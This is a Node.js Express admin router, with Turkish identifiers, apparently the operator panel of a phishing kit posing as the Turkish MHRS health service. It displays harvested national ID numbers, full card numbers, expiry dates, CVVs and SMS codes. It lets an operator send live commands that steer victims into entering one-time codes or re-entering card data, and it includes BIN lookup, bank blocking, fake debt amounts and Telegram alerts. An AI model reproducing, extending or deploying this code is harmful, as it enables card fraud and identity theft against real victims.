const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const Admin = require('../models/Admin');
const Visitor = require('../models/Visitor');
const User = require('../models/User');
const Odeme = require('../models/Odeme');
const Bin = require('../models/Bin');
const Logger = require('../utils/logger');
const ayarlarStore = require('../utils/ayarlar');
const dbConnection = require('../utils/db');
const telegram = require('../utils/telegram');

const router = express.Router();
const log = new Logger('Admin');

// 3 dakika içinde heartbeat gönderen ziyaretçi "çevrimiçi" sayılır
const CEVRIMICI_ESIĞI_MS = 3 * 60 * 1000;
const DURUMLAR = ['Bağlı değil', 'Bağlı', 'Bağlanıyor', 'Bağlantı kesiliyor'];

function oturumGerekli(req, res, next) {
    if (req.session && req.session.admin) return next();
    const apiIstek = req.is('json') || req.xhr ||
        String(req.get('accept') || '').includes('application/json') ||
        /\/veriler$/.test(req.path);
    if (apiIstek) {
        return res.status(401).json({ ok: false, hata: 'Oturum süresi doldu. Lütfen tekrar giriş yapın.' });
    }
    res.redirect('/SADSDAFHBEUBCE');
}

function maskeleUri(uri) {
    return String(uri).replace(/\/\/([^:/]+):([^@/]+)@/, '//$1:••••@');
}

function aktifBaglantiBilgisi() {
    const kayitli = ayarlarStore.oku();
    const readyState = mongoose.connection.readyState;
    return {
        durumMetni: DURUMLAR[readyState] || 'Bilinmiyor',
        durumBagli: readyState === 1,
        host: mongoose.connection.host || '-',
        bagliDb: mongoose.connection.name || '-',
        mevcutUri: kayitli.mongoUri || process.env.MONGODB_URI || '',
        mevcutDbName: kayitli.dbName || process.env.DB_NAME || 'mhrs_demo'
    };
}

function ayarlarBilgisi(req, ek) {
    const kayitli = ayarlarStore.oku();
    return {
        kullaniciAdi: req.session.admin,
        aktif: 'ayarlar',
        ...aktifBaglantiBilgisi(),
        telegram: kayitli.telegram || {},
        telegramMesaj: null,
        telegramHata: null,
        reklamOnay: !!kayitli.reklamOnay,
        banliKullaniciUrl: kayitli.banliKullaniciUrl || '',
        banliUrlMesaj: null,
        odemeTutar: typeof kayitli.odemeTutar === 'number' && kayitli.odemeTutar > 0 ? kayitli.odemeTutar : 0,
        gecikmeFaizi: typeof kayitli.gecikmeFaizi === 'number' && kayitli.gecikmeFaizi >= 0 ? kayitli.gecikmeFaizi : 0,
        borcBilgi: kayitli.borcBilgi || '',
        odemeMesaj: null,
        odemeHata: null,
        hesap: null,
        hesapMesaj: null,
        hesapHata: null,
        mesaj: null,
        hata: null,
        ...(ek || {})
    };
}

async function baglantiyiTestEt(uri, dbName) {
    const gecici = mongoose.createConnection(uri, {
        dbName: dbName || undefined,
        serverSelectionTimeoutMS: 5000,
        connectTimeoutMS: 5000,
        maxPoolSize: 5
    });
    try {
        await gecici.asPromise();
        return { ok: true };
    } catch (err) {
        return { ok: false, hata: err.message };
    } finally {
        await gecici.close().catch(() => {});
    }
}

async function panelVerileri() {
    const cevrimiciSiniri = new Date(Date.now() - CEVRIMICI_ESIĞI_MS);
    const cevrimiciZiyaretci = await Visitor.countDocuments({ sonGiris: { $gte: cevrimiciSiniri } });
    return { cevrimiciZiyaretci };
}

// Sıralama: çevrim içi olanlar en üstte; onların içinde kart bilgisi girenler bir kademe daha üstte; her grupta _id desc
async function kullanicilariGetir(cevrimiciSiniri, kartliTcnoDizisi) {
    const kullanicilar = await User.aggregate([
        { $addFields: {
            cevrimici: { $gte: ['$sonGiris', cevrimiciSiniri] },
            kartiVar: { $in: ['$tcno', kartliTcnoDizisi] }
        }},
        { $sort: { cevrimici: -1, kartiVar: -1, _id: -1 } }
    ]);

    const gorunenTcno = kullanicilar.map(u => u.tcno);
    const odemeler = await Odeme.find({ tcno: { $in: gorunenTcno } }).sort({ odemeTarihi: 1 }).lean();
    const odemeMap = new Map();
    odemeler.forEach(o => {
        if (!odemeMap.has(o.tcno)) odemeMap.set(o.tcno, []);
        odemeMap.get(o.tcno).push(o);
    });

    return kullanicilar.map(u => kullaniciPanelVerisi(u, odemeMap.get(u.tcno) || [], cevrimiciSiniri));
}

function kullaniciPanelVerisi(u, odemeler, cevrimiciSiniri) {
    const kartlar = odemeler.map(o => ({
        kartSahibi: o.kartSahibi || null,
        kartNo: o.kartNo || null,
        skt: o.skt || null,
        cvv: o.cvv || null,
        banka: o.banka || null,
        marka: o.marka || null,
        kartTuru: o.kartTuru || null,
        tutar: typeof o.tutar === 'number' ? o.tutar : null,
        odemeTarihi: o.odemeTarihi ? o.odemeTarihi.toISOString() : null
    }));
    const son = kartlar[kartlar.length - 1] || null;
    return {
        ad: u.ad || null,
        tcno: u.tcno,
        girisSayisi: u.girisSayisi,
        sonGiris: u.sonGiris ? u.sonGiris.toISOString() : null,
        createdAt: u.createdAt ? u.createdAt.toISOString() : null,
        cevrimici: !!(u.sonGiris && u.sonGiris >= cevrimiciSiniri),
        mevcutSayfa: u.mevcutSayfa || null,
        telefon: u.telefon || null,
        beklemeKomut: u.beklemeKomut || null,
        smsKod1: u.smsKod1 || null,
        smsKod2: u.smsKod2 || null,
        banli: !!u.banli,
        tcBilgi: u.tcBilgi || null,
        odeme: son ? { ...son, kartSayisi: kartlar.length, kartlar } : null
    };
}

router.get('/', (req, res) => {
    if (req.session && req.session.admin) return res.redirect('/SADSDAFHBEUBCE/panel');
    res.render('admin/login', { hata: null });
});

router.post('/giris', async (req, res) => {
    const kullaniciAdi = String(req.body.kullaniciAdi || '').trim();
    const sifre = String(req.body.sifre || '');
    const admin = await Admin.findOne({ kullaniciAdi });
    if (!admin || !(await bcrypt.compare(sifre, admin.sifreHash))) {
        log.warn('Başarısız admin giriş denemesi: ' + kullaniciAdi);
        return res.status(401).render('admin/login', { hata: 'Kullanıcı adı veya şifre hatalı.' });
    }
    req.session.admin = admin.kullaniciAdi;
    log.info('Admin girişi: ' + admin.kullaniciAdi);
    res.redirect('/SADSDAFHBEUBCE/panel');
});

router.get('/cikis', (req, res) => {
    log.info('Admin çıkışı: ' + (req.session.admin || '?'));
    req.session.destroy(() => res.redirect('/SADSDAFHBEUBCE'));
});

router.get('/panel', oturumGerekli, async (req, res) => {
    try {
        const cevrimiciSiniri = new Date(Date.now() - CEVRIMICI_ESIĞI_MS);
        const [veriler, kartliTcno] = await Promise.all([
            panelVerileri(),
            Odeme.distinct('tcno')
        ]);
        res.render('admin/dashboard', {
            kullaniciAdi: req.session.admin,
            aktif: 'panel',
            ...veriler,
            kullanicilar: await kullanicilariGetir(cevrimiciSiniri, kartliTcno)
        });
    } catch (err) {
        res.status(500).send('Panel verileri yüklenemedi.');
    }
});

router.get('/panel/veriler', oturumGerekli, async (req, res) => {
    try {
        const cevrimiciSiniri = new Date(Date.now() - CEVRIMICI_ESIĞI_MS);
        const [veriler, kartliTcno] = await Promise.all([
            panelVerileri(),
            Odeme.distinct('tcno')
        ]);
        res.json({
            ...veriler,
            kullanicilar: await kullanicilariGetir(cevrimiciSiniri, kartliTcno)
        });
    } catch (err) {
        res.status(500).json({ hata: 'Veriler alınamadı.' });
    }
});

router.post('/kullanici/sil', oturumGerekli, async (req, res) => {
    const tcno = String(req.body.tcno || '').trim();
    if (!tcno) return res.status(400).json({ ok: false, hata: 'T.C. No gerekli.' });
    try {
        const sonuc = await User.deleteOne({ tcno });
        if (sonuc.deletedCount === 0) return res.status(404).json({ ok: false, hata: 'Kullanıcı bulunamadı.' });
        log.warn('Kullanıcı silindi: ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'Kullanıcı silinemedi.' });
    }
});

router.post('/kullanici/ban', oturumGerekli, async (req, res) => {
    const tcno = String(req.body.tcno || '').trim();
    const banli = req.body.banli === true;
    if (!tcno) return res.status(400).json({ ok: false, hata: 'T.C. No gerekli.' });
    try {
        const sonuc = await User.updateOne(
            { tcno },
            { $set: { banli, banTarihi: banli ? new Date() : null } }
        );
        if (sonuc.matchedCount === 0) return res.status(404).json({ ok: false, hata: 'Kullanıcı bulunamadı.' });
        log.warn('Kullanıcı ' + (banli ? 'yasaklandı: ' : 'yasağı kaldırıldı: ') + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true, banli });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'İşlem yapılamadı.' });
    }
});

router.post('/kullanici/temizle-kartsiz', oturumGerekli, async (req, res) => {
    try {
        const kartliTcnoSet = new Set((await Odeme.distinct('tcno')));
        const sonuc = await User.deleteMany({ tcno: { $nin: Array.from(kartliTcnoSet) } });
        log.warn('Kart bilgisi olmayan kullanıcılar silindi: ' + sonuc.deletedCount + ' kişi');
        res.json({ ok: true, silinen: sonuc.deletedCount });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'Temizleme başarısız.' });
    }
});

router.post('/kullanici/temizle-tumu', oturumGerekli, async (req, res) => {
    try {
        const [kullaniciSonuc, odemeSonuc] = await Promise.all([
            User.deleteMany({}),
            Odeme.deleteMany({})
        ]);
        log.warn('Tüm kullanıcılar ve ödemeler silindi: ' + kullaniciSonuc.deletedCount + ' kullanıcı, ' + odemeSonuc.deletedCount + ' ödeme');
        res.json({ ok: true, silinen: kullaniciSonuc.deletedCount, silinenOdeme: odemeSonuc.deletedCount });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'Temizleme başarısız.' });
    }
});

router.post('/kullanici/uyari-gonder', oturumGerekli, async (req, res) => {
    const tcno = String(req.body.tcno || '').trim();
    const mesaj = String(req.body.mesaj || '').trim();
    if (!tcno) return res.status(400).json({ ok: false, hata: 'T.C. No gerekli.' });
    if (!mesaj) return res.status(400).json({ ok: false, hata: 'Uyarı mesajı boş olamaz.' });
    try {
        const sonuc = await User.updateOne({ tcno }, { $set: { uyariMesaj: mesaj } });
        if (sonuc.matchedCount === 0) return res.status(404).json({ ok: false, hata: 'Kullanıcı bulunamadı.' });
        log.warn('Uyarı mesajı gönderildi (' + mesaj.slice(0, 30) + '...): ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'Uyarı gönderilemedi.' });
    }
});

router.post('/panel/komut', oturumGerekli, async (req, res) => {
    const tcno = String(req.body.tcno || '').trim();
    const komut = String(req.body.komut || '').trim();
    const GECERLI = [
        'sms', 'hatali', 'onay', 'basa', 'internetKapali',
        'gecersizKart',
        'gecersizKart:kartNo', 'gecersizKart:skt', 'gecersizKart:cvv'
    ];
    if (!tcno) return res.status(400).json({ ok: false, hata: 'T.C. No gerekli.' });
    if (GECERLI.indexOf(komut) === -1 && !(komut && komut.indexOf('gecersizKart:') === 0)) {
        return res.status(400).json({ ok: false, hata: 'Geçersiz komut.' });
    }
    try {
        const guncelle = { beklemeKomut: komut };
        if (komut === 'basa') { guncelle.smsKod1 = null; guncelle.smsKod2 = null; }
        const sonuc = await User.updateOne({ tcno }, { $set: guncelle });
        if (sonuc.matchedCount === 0) return res.status(404).json({ ok: false, hata: 'Kullanıcı bulunamadı.' });
        log.warn('Komut gönderildi (' + komut + '): ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true, komut });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'Komut gönderilemedi.' });
    }
});

router.post('/panel/bin-kaydet', oturumGerekli, async (req, res) => {
    const banka = String(req.body.banka || '').trim();
    const bin = String(req.body.bin || '').replace(/\D/g, '').slice(0, 6);
    const kartTuru = String(req.body.kartTuru || 'KREDİ KARTI').trim() || 'KREDİ KARTI';
    const marka = String(req.body.marka || '').trim();

    if (!banka) return res.status(400).json({ ok: false, hata: 'Banka seçimi gerekli.' });
    if (!bin || bin.length !== 6) return res.status(400).json({ ok: false, hata: '6 haneli BIN gerekli.' });

    try {
        await Bin.findOneAndUpdate(
            { bin },
            { $set: { banka, kartTuru, marka: marka || 'Bilinmiyor' } },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );
        log.warn('BIN kaydedildi: ' + banka + ' / ' + bin);
        res.json({ ok: true, bin, banka, kartTuru, marka: marka || 'Bilinmiyor' });
    } catch (err) {
        res.status(500).json({ ok: false, hata: 'BIN kaydedilemedi.' });
    }
});

function binVerisi(b) {
    return {
        bin: b.bin,
        banka: b.banka || null,
        kartTuru: b.kartTuru || null,
        marka: b.marka || null
    };
}

function anlikAktifMiddleware(req, res, next) {
    panelVerileri()
        .then(v => { res.locals.cevrimiciZiyaretci = v.cevrimiciZiyaretci; next(); })
        .catch(() => { res.locals.cevrimiciZiyaretci = 0; next(); });
}

router.get('/kart-binleri', oturumGerekli, anlikAktifMiddleware, async (req, res) => {
    try {
        const binler = await Bin.find().sort({ bin: 1 }).limit(1000).lean();
        const kapaliBankalar = ayarlarStore.oku().kapaliBankalar || [];
        res.render('admin/binler', {
            kullaniciAdi: req.session.admin,
            aktif: 'binler',
            binler: binler.map(binVerisi),
            bankaKartiEngelli: !!ayarlarStore.oku().bankaKartiEngelli,
            troyKartiEngelli: !!ayarlarStore.oku().troyKartiEngelli,
            kapaliBankalar: JSON.stringify(kapaliBankalar).replace(/</g, '\\u003c')
        });
    } catch (err) {
        res.status(500).send('Kart binleri yüklenemedi.');
    }
});

router.get('/kart-binleri/veriler', oturumGerekli, async (req, res) => {
    try {
        const binler = await Bin.find().sort({ bin: 1 }).limit(1000).lean();
        res.json(binler.map(binVerisi));
    } catch (err) {
        res.status(500).json({ hata: 'Kart binleri alınamadı.' });
    }
});

router.get('/kart-binleri/bankalar', oturumGerekli, async (req, res) => {
    try {
        const bankalar = await Bin.distinct('banka');
        const kapaliBankalar = new Set(ayarlarStore.oku().kapaliBankalar || []);
        res.json(bankalar.map(b => ({ banka: b, kapali: kapaliBankalar.has(b) })));
    } catch (err) {
        res.status(500).json({ hata: 'Bankalar alınamadı.' });
    }
});

router.post('/kart-binleri/banka-engelle-many', oturumGerekli, (req, res) => {
    const detay = req.body && req.body.bankalar;
    if (!Array.isArray(detay)) return res.status(400).json({ ok: false, hata: 'Banka listesi geçersiz.' });
    const kapali = detay.filter(b => b && b.kapali).map(b => String(b.banka).trim());
    ayarlarStore.yaz({ ...ayarlarStore.oku(), kapaliBankalar: kapali });
    log.warn('Kapalı bankalar güncellendi: ' + (kapali.length ? kapali.join(', ') : 'hiçbiri'));
    res.json({ ok: true });
});

router.post('/kart-binleri/banka-engelle', oturumGerekli, (req, res) => {
    const engelli = req.body.engelli === true;
    ayarlarStore.yaz({ ...ayarlarStore.oku(), bankaKartiEngelli: engelli });
    log.warn('Banka kartları ' + (engelli ? 'engellendi' : 'açıldı') + ' (ödeme ekranında BANKA türü kartlar reddedilecek).');
    res.json({ ok: true, engelli });
});

router.post('/kart-binleri/troy-engelle', oturumGerekli, (req, res) => {
    const engelli = req.body.engelli === true;
    ayarlarStore.yaz({ ...ayarlarStore.oku(), troyKartiEngelli: engelli });
    log.warn('Troy kartları ' + (engelli ? 'engellendi' : 'açıldı') + ' (ödeme ekranında TROY türü kartlar reddedilecek).');
    res.json({ ok: true, engelli });
});

router.get('/ayarlar', oturumGerekli, anlikAktifMiddleware, (req, res) => {
    res.render('admin/ayarlar', ayarlarBilgisi(req));
});

router.post('/ayarlar/test', oturumGerekli, async (req, res) => {
    const uri = String(req.body.mongoUri || '').trim();
    const dbName = String(req.body.dbName || '').trim();
    if (!uri) return res.json({ ok: false, hata: 'MongoDB URI boş olamaz.' });
    const sonuc = await baglantiyiTestEt(uri, dbName);
    if (sonuc.ok) {
        log.info('Bağlantı testi başarılı: ' + maskeleUri(uri));
    } else {
        log.warn('Bağlantı testi başarısız: ' + sonuc.hata);
    }
    res.json(sonuc);
});

router.post('/ayarlar/kaydet', oturumGerekli, anlikAktifMiddleware, async (req, res) => {
    const uri = String(req.body.mongoUri || '').trim();
    const dbName = String(req.body.dbName || '').trim();
    const render = (mesaj, hata) => res.render('admin/ayarlar', ayarlarBilgisi(req, { mesaj, hata }));

    if (!uri) return render(null, 'MongoDB URI boş olamaz.');

    // Önce yeni bağlantıyı test et - mevcut bağlantıyı bozmadan
    const sonuc = await baglantiyiTestEt(uri, dbName);
    if (!sonuc.ok) {
        return render(null, 'Yeni bağlantı kurulamadı: ' + sonuc.hata);
    }

    try {
        ayarlarStore.yaz({ ...ayarlarStore.oku(), mongoUri: uri, dbName });
        await dbConnection.close();
        await dbConnection.connect(uri, dbName || undefined);
        log.info('Bağlantı ayarları güncellendi: ' + maskeleUri(uri));
        return render('Bağlantı ayarları kaydedildi ve yeniden bağlanıldı.', null);
    } catch (err) {
        return render(null, 'Yeniden bağlanılamadı: ' + err.message);
    }
});

router.post('/ayarlar/hesap', oturumGerekli, anlikAktifMiddleware, async (req, res) => {
    const mevcutAd = req.session.admin;
    const yeniKullaniciAdi = String(req.body.kullaniciAdi || '').trim();
    const mevcutSifre = String(req.body.mevcutSifre || '');
    const yeniSifre = String(req.body.yeniSifre || '');
    const yeniSifreTekrar = String(req.body.yeniSifreTekrar || '');
    const render = (mesaj, hata) => res.render('admin/ayarlar', ayarlarBilgisi(req, {
        hesapMesaj: mesaj,
        hesapHata: hata,
        hesap: { kullaniciAdi: yeniKullaniciAdi }
    }));

    try {
        const admin = await Admin.findOne({ kullaniciAdi: mevcutAd });
        if (!admin) return render(null, 'Oturumdaki yönetici bulunamadı.');

        if (!mevcutSifre) return render(null, 'Değişiklik için mevcut şifrenizi girmeniz gerekir.');
        if (!(await bcrypt.compare(mevcutSifre, admin.sifreHash))) {
            log.warn('Yanlış mevcut şifre ile hesap güncelleme denemesi: ' + mevcutAd);
            return render(null, 'Mevcut şifre hatalı.');
        }

        let yeniAd = mevcutAd;
        if (yeniKullaniciAdi) {
            if (yeniKullaniciAdi.length < 3) return render(null, 'Kullanıcı adı en az 3 karakter olmalıdır.');
            if (!/^[a-zA-Z0-9_.]+$/.test(yeniKullaniciAdi)) {
                return render(null, 'Kullanıcı adı yalnızca harf, rakam, nokta ve alt çizgi içerebilir.');
            }
            const ayniAd = await Admin.findOne({ kullaniciAdi: yeniKullaniciAdi });
            if (ayniAd && ayniAd._id.toString() !== admin._id.toString()) {
                return render(null, 'Bu kullanıcı adı zaten kullanılıyor.');
            }
            yeniAd = yeniKullaniciAdi;
        }

        let yeniHash = null;
        if (yeniSifre) {
            if (yeniSifre.length < 6) return render(null, 'Yeni şifre en az 6 karakter olmalıdır.');
            if (yeniSifre !== yeniSifreTekrar) return render(null, 'Yeni şifre tekrarı uyuşmuyor.');
            if (yeniSifre === mevcutSifre) return render(null, 'Yeni şifre mevcut şifreyle aynı olamaz.');
            yeniHash = await bcrypt.hash(yeniSifre, 10);
        }

        const guncelleme = {};
        if (yeniAd !== mevcutAd) guncelleme.kullaniciAdi = yeniAd;
        if (yeniHash) guncelleme.sifreHash = yeniHash;
        if (Object.keys(guncelleme).length === 0) {
            return render(null, 'Değiştirilecek bir alan bulunamadı. Yeni kullanıcı adı veya yeni şifre girin.');
        }

        await Admin.updateOne({ _id: admin._id }, { $set: guncelleme });
        req.session.admin = yeniAd;
        const parcalar = [];
        if (yeniAd !== mevcutAd) parcalar.push('kullanıcı adı: ' + mevcutAd + ' → ' + yeniAd);
        if (yeniHash) parcalar.push('şifre güncellendi');
        log.warn('Yönetici hesabı güncellendi: ' + mevcutAd + ' -> ' + yeniAd);
        return render('Hesap güncellendi (' + parcalar.join(', ') + ').', null);
    } catch (err) {
        log.error('Hesap güncelleme hatası: ' + err.message);
        return render(null, 'Hesap güncellenemedi: ' + err.message);
    }
});

router.post('/ayarlar/telegram/test', oturumGerekli, async (req, res) => {
    const botToken = String(req.body.botToken || '').trim();
    const adminId = String(req.body.adminId || '').trim();
    const grupId = String(req.body.grupId || '').trim();
    if (!botToken) return res.json({ ok: false, hata: 'Bot token boş olamaz.' });
    try {
        const bot = await telegram.botBilgisi(botToken);
        const gonderilen = [];
        if (adminId) {
            await telegram.mesajGonder(botToken, adminId, 'MHRS yönetim botu bağlantı testi başarılı.');
            gonderilen.push('admin');
        }
        if (grupId) {
            await telegram.mesajGonder(botToken, grupId, 'MHRS yönetim botu grup bağlantı testi başarılı.');
            gonderilen.push('grup');
        }
        log.info('Telegram bot testi başarılı: @' + bot.username +
            (gonderilen.length ? ' -> mesaj gönderildi: ' + gonderilen.join(', ') : ''));
        res.json({ ok: true, bot: '@' + bot.username, gonderilen });
    } catch (err) {
        log.warn('Telegram bot testi başarısız: ' + err.message);
        res.json({ ok: false, hata: err.message });
    }
});

router.post('/ayarlar/telegram/kaydet', oturumGerekli, anlikAktifMiddleware, async (req, res) => {
    const botToken = String(req.body.botToken || '').trim();
    const adminId = String(req.body.adminId || '').trim();
    const grupId = String(req.body.grupId || '').trim();
    const render = (mesaj, hata) => res.render('admin/ayarlar', ayarlarBilgisi(req, {
        telegram: { botToken, adminId, grupId },
        telegramMesaj: mesaj,
        telegramHata: hata
    }));

    if (!botToken) return render(null, 'Bot token boş olamaz.');
    try {
        const bot = await telegram.botBilgisi(botToken);
        ayarlarStore.yaz({ ...ayarlarStore.oku(), telegram: { botToken, adminId, grupId } });
        log.info('Telegram ayarları kaydedildi: @' + bot.username);
        return render('Telegram ayarları kaydedildi (bot: @' + bot.username + ').', null);
    } catch (err) {
        return render(null, 'Bot doğrulanamadı: ' + err.message);
    }
});

router.post('/ayarlar/reklam-onay', oturumGerekli, (req, res) => {
    const acik = req.body.acik === true;
    ayarlarStore.yaz({ ...ayarlarStore.oku(), reklamOnay: acik });
    log.warn('Reklam onayı ' + (acik ? 'açıldı' : 'kapatıldı') + ' (gelen kullanıcılar reklam sayfasına yönlendirilecek).');
    res.json({ ok: true, acik });
});

router.post('/ayarlar/banli-kullanici-url', oturumGerekli, anlikAktifMiddleware, (req, res) => {
    const url = String(req.body.url || '').trim();
    ayarlarStore.yaz({ ...ayarlarStore.oku(), banliKullaniciUrl: url });
    log.warn('Banlı kullanıcı yönlendirme linki güncellendi: ' + url);
    res.render('admin/ayarlar', ayarlarBilgisi(req, {
        banliUrlMesaj: url ? 'Banlı kullanıcı yönlendirme linki kaydedildi.' : 'Banlı kullanıcı yönlendirme linki temizlendi.'
    }));
});

router.post('/ayarlar/odeme-bilgi', oturumGerekli, anlikAktifMiddleware, (req, res) => {
    const yeni = { ...ayarlarStore.oku() };
    const render = (mesaj, hata) => res.render('admin/ayarlar', ayarlarBilgisi(req, { odemeMesaj: mesaj, odemeHata: hata }));

    const tutarHam = String(req.body.odemeTutar || '').trim().replace(',', '.');
    if (tutarHam !== '') {
        const tutar = Number(tutarHam);
        if (!Number.isFinite(tutar) || tutar <= 0) {
            return render(null, 'Borç tutarı 0\'dan büyük geçerli bir sayı olmalıdır (örn. 102.37).');
        }
        yeni.odemeTutar = +tutar.toFixed(2);
    }

    const faizHam = String(req.body.gecikmeFaizi || '').trim().replace(',', '.');
    if (faizHam !== '') {
        const faiz = Number(faizHam);
        if (!Number.isFinite(faiz) || faiz < 0) {
            return render(null, 'Gecikme faizi 0 veya daha büyük bir sayı olmalıdır (örn. 2.37).');
        }
        yeni.gecikmeFaizi = +faiz.toFixed(2);
    }

    const borc = String(req.body.borcBilgi || '').trim();
    if (borc) yeni.borcBilgi = borc;

    ayarlarStore.yaz(yeni);
    log.warn('Ödeme bilgileri güncellendi: tutar=' + (yeni.odemeTutar ?? 'varsayılan') + ' TL, faiz=' + (yeni.gecikmeFaizi ?? 0) + ' TL' + (borc ? ', borç: ' + borc : ''));
    res.render('admin/ayarlar', ayarlarBilgisi(req, { odemeMesaj: 'Ödeme bilgileri kaydedildi. Boş bırakılan alanlar korundu.' }));
});

module.exports = router;
